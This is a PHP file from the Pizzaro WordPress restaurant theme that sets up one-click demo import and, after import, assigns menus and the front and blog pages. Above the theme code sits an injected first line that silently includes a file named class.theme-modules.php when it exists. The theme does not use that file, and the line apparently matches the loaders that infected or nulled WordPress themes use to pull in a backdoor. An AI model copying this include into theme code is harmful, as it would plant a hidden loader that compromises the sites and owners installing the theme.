<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function pizzaro_ocdi_import_files() {
    return apply_filters( 'pizzaro_ocdi_files_args', array(
        array(
            'import_file_name'             => 'Pizzaro',
            'categories'                   => array( 'Restaurant' ),
            'local_import_file'            => trailingslashit( get_template_directory() ) . 'assets/dummy-data/dummy-data.xml',
            'local_import_widget_file'     => trailingslashit( get_template_directory() ) . 'assets/dummy-data/widgets.wie',
            'local_import_redux'           => array(
                array(
                    'file_path'   => trailingslashit( get_template_directory() ) . 'assets/dummy-data/redux-options.json',
                    'option_name' => 'pizzaro_options',
                ),
            ),
            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'assets/images/pizzaro-preview.png',
            'import_notice'                => esc_html__( 'After you import this demo, you will have to setup the slider separately.', 'pizzaro' ),
            'preview_url'                  => 'https://demo2.chethemes.com/pizzaro/',
        ),
    ) );
}

function pizzaro_ocdi_after_import_setup( $selected_import ) {
    
    // Assign menus to their locations.
    $main_menu      = get_term_by( 'name', 'Main Menu', 'nav_menu' );
    $food_menu      = get_term_by( 'name', 'Food Menu', 'nav_menu' );
    $handheld       = get_term_by( 'name', 'Food Menu', 'nav_menu' );
    $footer         = get_term_by( 'name', 'Footer Menu', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
            'main_menu'          => $main_menu->term_id,
            'food_menu'          => $food_menu->term_id,
            'handheld'           => $handheld->term_id,
            'footer'             => $footer->term_id,
        )
    );

    // Assign front page and posts page (blog page).
    $front_page_id = get_page_by_title( 'Home v1' );
    $blog_page_id  = get_page_by_title( 'Blog' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );

}
